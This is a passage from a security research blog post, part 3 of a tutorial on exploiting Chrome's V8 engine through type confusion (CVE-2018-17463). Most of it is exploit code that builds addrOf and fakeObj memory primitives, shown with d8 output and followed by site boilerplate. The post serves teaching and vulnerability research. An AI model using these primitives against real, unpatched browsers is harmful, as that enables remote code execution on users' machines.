    <span class="hljs-comment">// Create an array of negative values from -1 to -32 to be used</span>
    <span class="hljs-comment">// for out makeObj function</span>
    let pValues = [];
    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">32</span>; i++) {
        pValues[i] = -i;
    }

    <span class="hljs-comment">// JIT code to trigger vuln</span>
    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        <span class="hljs-comment">// Create Object and pass it to Vuln function</span>
        let res = vuln(makeObj(pValues));
        <span class="hljs-comment">// Look for overlapping properties in results</span>
        <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">1</span>; i &lt; res.length; i++) {
            <span class="hljs-comment">// If i is not the same value, and res[i] is between -32 and 0, it overlaps</span>
            <span class="hljs-keyword">if</span> (i !== -res[i] &amp;&amp; res[i] &lt; <span class="hljs-number">0</span> &amp;&amp; res[i] &gt; <span class="hljs-number">-32</span>) {
                [p1, p2] = [i, -res[i]];
                <span class="hljs-keyword">return</span>;
            }
        }
    }
    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] Failed to find overlapping properties&quot;</span>;
}

<span class="hljs-function">function <span class="hljs-title">addrOf</span><span class="hljs-params">()</span> </span>{
    eval(`
    function vuln(obj) {
      obj.<span class="hljs-keyword">inline</span>;
      <span class="hljs-keyword">this</span>.Object.create(obj);
      <span class="hljs-comment">// Trigger our type-confusion by accessing an out-of-bound property</span>
        <span class="hljs-comment">// This will load p1 from our object thinking it&apos;s a Double, but instead</span>
        <span class="hljs-comment">// due to overlap, it will load p2 which is an Object</span>
      <span class="hljs-keyword">return</span> obj.p${p1}.x;
    }
  `);

    let obj = {z: <span class="hljs-number">1234</span>};
    let pValues = [];
    pValues[p1] = {x: <span class="hljs-number">13.37</span>};
    pValues[p2] = {y: obj};

    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        let res = vuln(makeObj(pValues));
        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {
            %DebugPrint(obj);
            <span class="hljs-keyword">return</span> res;
        }
    }
    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>
}

print(<span class="hljs-string">&quot;[+] Finding Overlapping Properties...&quot;</span>);
findOverlappingProperties();
print(`[+] Properties p${p1} <span class="hljs-keyword">and</span> p${p2} overlap!`);
let x = addrOf();
print(<span class="hljs-string">&quot;[+] Leaking Object Address...&quot;</span>);
print(`[+] Object Address: ${x}`);</code></pre>
<p>When you run the code in <code>d8</code>, you get a result like this:</p>
<p><img src="image%209.png" srcset="/img/loading.gif" alt="image.png"></p>
<p>The output labeled <code>Object Address</code> is printed in double format because it&#x2019;s interpreted as a <code>double</code>. So you need to convert that double to an address &#x2014; the conversion shown above will give you the address!</p>
<h3 id="The-fakeObj-Write-Primitive"><a href="#The-fakeObj-Write-Primitive" class="headerlink" title="The fakeObj Write Primitive"></a>The fakeObj Write Primitive</h3><p>You can get a write primitive by doing the reverse of the read primitive &#x2014; no new vulnerability is required. That&#x2019;s one of the strengths of Type Confusion: if a pointer is being interpreted as a double (and reading the pointer leaked an address), then writing to a double slot (via the same confusion) can instead write into the pointer&#x2019;s target.</p>
<pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params"></span>) </span>{
    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span>
<span class="hljs-string">    function vuln(obj) {</span>
<span class="hljs-string">      obj.inline;</span>
<span class="hljs-string">      this.Object.create(obj);</span>
<span class="hljs-string">      let orig = obj.p<span class="hljs-subst">${p1}</span>.x;</span>
<span class="hljs-string">      // Overwrite property x of p1, but due to type confusion</span>
<span class="hljs-string">      // we overwrite property y of p2</span>
<span class="hljs-string">      obj.p<span class="hljs-subst">${p1}</span>.x = 0x41414141n;</span>
<span class="hljs-string">      return orig;</span>
<span class="hljs-string">    }</span>
<span class="hljs-string">  `</span>);

    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>};
    <span class="hljs-keyword">let</span> pValues = [];
    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>};
    pValues[p2] = {<span class="hljs-attr">y</span>: obj};

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));
        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {
            <span class="hljs-keyword">return</span> res;
        }
    }
}</code></pre>
<p>If you replace the <code>let x = addrOf();</code> line in the Read primitive code with a call to <code>fakeObj()</code> and run it in <code>d8</code>, you&#x2019;ll get results like below. As you can see, the <code>obj</code> pointer&#x2019;s address is overwritten with <code>0x41414141</code>. Isn&#x2019;t Type Confusion a delightfully simple way to get primitives? &#x1F604;</p>
<p><img src="image%2010.png" srcset="/img/loading.gif" alt="image.png"></p>
<p>Now that we have a read primitive for addresses and a write primitive that can overwrite an object pointer, the next step would be to refine these into full arbitrary memory read/write primitives (AAR/AAW) for exploitation. I intended to cover that here but ran out of space and want to produce a higher-quality write-up, so I&#x2019;ll move that content to the next part.</p>
<p>In the next part I&#x2019;ll explain how Read/Write primitives in the Chrome renderer lead to RCE, and how renderer RCE changed after the Heap Sandbox was introduced. I&#x2019;ll be back soon &#x2014; see you next time! :)</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://jhalon.github.io/chrome-browser-exploitation-1/">https://jhalon.github.io/chrome-browser-exploitation-1/</a></p>
<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://jhalon.github.io/chrome-browser-exploitation-2/">https://jhalon.github.io/chrome-browser-exploitation-2/</a></p>
<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://jhalon.github.io/chrome-browser-exploitation-3/">https://jhalon.github.io/chrome-browser-exploitation-3/</a></p>
<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://ssd-disclosure.com/ssd-advisory-chrome-type-confusion-in-jscreateobject-operation-to-rce/">https://ssd-disclosure.com/ssd-advisory-chrome-type-confusion-in-jscreateobject-operation-to-rce/</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                <div class="post-meta mr-3">
                  <i class="iconfont icon-category"></i>
                  
                  <a class="hover-with-bg" href="/categories/Research/">Research</a>
                  
                </div>
                
                
                <div class="post-meta">
                  <i class="iconfont icon-tags"></i>
                  
                  <a class="hover-with-bg" href="/tags/RCE/">RCE</a>
                  
                  <a class="hover-with-bg" href="/tags/OUYA77/">OUYA77</a>
                  
                  <a class="hover-with-bg" href="/tags/pwnable/">pwnable</a>
                  
                  <a class="hover-with-bg" href="/tags/Type-Confusion/">Type Confusion</a>
                  
                  <a class="hover-with-bg" href="/tags/Type-Confusion-101/">Type Confusion 101</a>
                  
                  <a class="hover-with-bg" href="/tags/Chrome/">Chrome</a>
                  
                  <a class="hover-with-bg" href="/tags/Chromium/">Chromium</a>
                  
                  <a class="hover-with-bg" href="/tags/CVE-2018-17463/">CVE-2018-17463</a>
                  
                </div>
                
              </div>

              <div class="post-metas mb-3">
                <a class="hover-with-bg" style="display: flex;" href="/author">
                  <div class="link-avatar-page">
                    <img src="/img/profile_OUYA77.jpg" srcset="/img/loading.gif" alt="OUYA77">
                  </div>

                  <div class="link-text">
                    <div class="link-title">OUYA77</div>
                  </div>
                </a>
                <div class="link-text">
                  <div class="link-more">
                    <a href="/tags/OUYA77">
                      Read more
                      <i class="iconfont icon-arrowdown"></i>
                    </a>
                  </div>
                </div>
              </div>

              <hr>
              <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
              
              <!--  -->
              <p class="note note-warning">  <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a>  .        .</p>
              
              
              
              <div class="post-prevnext row">
                <article class="post-prev col-6">
                  
                  
                  <a href="/2025/10/01/ji9umi/CVE-2025-48062/">
                    <i class="iconfont icon-arrowleft"></i>
                    <span class="hidden-mobile">[] CVE-2025-48062: Discourse Topic      HTML Injection </span>
                    <span class="visible-mobile">Previous</span>
                  </a>
                  
                </article>
                <article class="post-next col-6">
                  
                  
                  <a href="/2025/09/26/OUYA77/Chrome_part3/kr/">
                    <span class="hidden-mobile">[Research] Type Confusion 101  Chrome Exploit ^-^Part 3.(KR)</span>
                    <span class="visible-mobile">Next</span>
                    <i class="iconfont icon-arrowright"></i>
                  </a>
                  
                </article>
              </div>
              
            </div>
            
            <!-- Embed Section -->
            <div style="width: 100%; height: 210px; margin-bottom: 50px; overflow: hidden;">
              <iframe src="https://maily.so/hackyboiz/embed?src=embed" style="width: 100%; height: 100%; border: none;" frameborder="0"></iframe>
            </div>            

            
            <!-- Comments -->
            <article class="comments" id="comments">
              
              
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
      var disqus_config = function () {
        this.page.url = 'https://hackyboiz.github.io/2025/09/26/OUYA77/Chrome_part3/en/';
        this.page.identifier = '/2025/09/26/OUYA77/Chrome_part3/en/';
      };
      function loadDisqus() {
        (function () {
          var d = document,
            s = d.createElement('script');
          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
          s.setAttribute('data-timestamp', new Date());
          (d.head || d.body).appendChild(s);
        })();
      }
      waitElementVisible('disqus_thread', loadDisqus);
    </script>
    <noscript>Please enable JavaScript to view the
      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
    </noscript>
  </div>


            </article>
            
          </article>
        </div>
      </div>
    </div>
    
    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
      <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

    </div>
    
  </div>
</div>

<!-- Custom -->

    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="/js/debouncer.js"></script>
<script src="/js/main.js"></script>

<!-- Plugins -->


  
    <script src="/js/lazyload.js"></script>
  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
  <script src="/js/clipboard-use.js"></script>







  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "[Research] Starting Chrome Exploitation with Type Confusion 101 ^-^ Part 3.(EN)&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>





  

  
    <!-- MathJax -->
    <script>
      MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']]
        },
        options: {
          renderActions: {
            findScript: [10, doc => {
              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
                const display = !!node.type.match(/; *mode=display/);
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
                const text = document.createTextNode('');
                node.parentNode.replaceChild(text, node);
                math.start = { node: text, delim: '', n: 0 };
                math.end = { node: text, delim: '', n: 0 };
                doc.math.push(math);
              });
            }, '', false],
            insertedScript: [200, () => {
              document.querySelectorAll('mjx-container').forEach(node => {
                let target = node.parentNode;
                if (target.nodeName.toLowerCase() === 'li') {
                  target.parentNode.classList.add('has-jax');
                }
              });
            }, '', false]
          }
        }
      };
    </script>

    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>

  













  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'UA-177243668-2', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"></script>
  

  
    <!-- Google gtag.js -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
    <script defer>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-177243668-2');
    </script>
  

  

  

  





</body>
</html>
